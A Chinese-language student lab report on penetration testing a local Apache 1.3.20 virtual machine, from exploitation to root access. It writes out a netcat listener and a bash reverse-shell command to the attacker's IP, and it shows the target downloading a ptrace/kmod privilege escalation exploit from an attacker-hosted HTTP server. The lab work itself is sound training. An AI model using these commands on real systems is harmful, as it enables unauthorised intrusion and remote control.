## 一、实验目的

本次实验的目标是对一台提供 Apache 服务的靶机进行渗透测试，最终获取 root 权限。  
整个过程包括网络信息收集、端口与服务探测、Web 页面分析、漏洞利用、反弹 shell、文件传输以及提权等完整的攻击链。  
实验重点是综合利用信息收集与漏洞利用技术，掌握从枚举到提权的完整流程。

---

## 二、实验环境

- 攻击机：Kali Linux
- 靶机：demo 1.ova（NATNetwork 模式）
- 工具：arp-scan、nmap、dirbuster、searchsploit、gcc、nc、python3 http.server、ssh、rockyou.txt 等

### 4. 漏洞利用与反弹 Shell

成功编译后运行 exploit，根据 Apache1.3.20 版本选了对应的 0x6a和0x6b，先运行0x6a发现显示连接成功但是没有任何反应，![image.png](https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/20251008000228.png)运行0x6b之后发现：![image.png](https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/20251008000240.png)
成功地连接上了shell！

之后建立反弹shell：
在 Kali 上启动监听：
```
nc -lvnp 4444
```
在目标端执行反弹 shell 命令：
```
bash -i >& /dev/tcp/192.168.50.4/4444 0>&1
```
![image.png](https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/20251008001420.png)
> 最后发现反弹shell这一步是没有用的

**接着想办法提权**，前面在执行代码的时候，提到有一个文件下载失败了，因此手动地在kali上面先下载文件，然后启动一个http.server
```
python3 -m http.server 9000
```
然后从靶机 wget [http://192.168.50.4:9000/exploit](http://192.168.50.4:9000/ptrace=kmod.c)
然后再靶机上重新运行expolit代码。最终我拿到了 root 权限。并且使用前面探索到的ssh登录方式进行登录

## 四、实验结果

经过多轮扫描与利用，我成功取得了靶机的 root 权限，验证了漏洞利用与反弹 shell、提权流程。  
整个实验过程包括了网络扫描、信息枚举、漏洞搜索、编译调试、利用与反弹 shell 的完整链条。

最终结果如下：
- 成功获取 shell 并提权为 root
- 通过 SSH 成功登录

## 五、实验中遇到的问题与解决方法


| 问题           | 解决方法                                  |
| ------------ | ------------------------------------- |
| Kali无法上网     | 重新弄了一个NatNetWork                      |
| exploit 编译出错 | 问ai，然后安装 libssl-dev，添加 -lcrypto       |
| exploit运行失败  | 自建 HTTP 服务让靶机下载缺少的文件                  |
| SSH 登录失败     | 问ai，调整 HostKeyAlgorithms 和 Ciphers 参数 |

> [!NOTE] 没有解决的问题
> 1. 我在获取了主机的一个用户名harold之后，最终还是没能爆破ssh进行登录
> 2. ![image.png](https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/20251008095244.png)图中的两个Natnetwork只在网段上面有差异，但是却只有我自己的这个net是可以上外网的？
